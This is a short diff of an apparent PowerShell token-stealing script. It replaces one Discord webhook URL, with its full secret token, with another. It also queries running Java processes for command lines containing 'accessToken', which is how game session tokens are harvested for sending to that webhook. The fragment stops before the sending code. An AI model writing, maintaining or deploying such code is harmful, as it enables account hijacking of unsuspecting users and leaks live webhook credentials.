@@ -1,4 +1,4 @@
-$webhookUrl = "https://discord.com/api/webhooks/1368083966749315142/s5w1ApIDhPKB7r72CMgHRRpBNLXIy6IKFDAszbBVn3cgasLmvQdfojruiAIAT5vhYBJr"
+$webhookUrl = "https://discord.com/api/webhooks/1398946726496305152/Kn9ULfJCNezuBKC_3Bs0E9l77SFysZLSqMMF0K-O8wDGJUgG13l5Mk8riFWJznckKInt"
 
 Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
     Select-Object -ExpandProperty CommandLine |
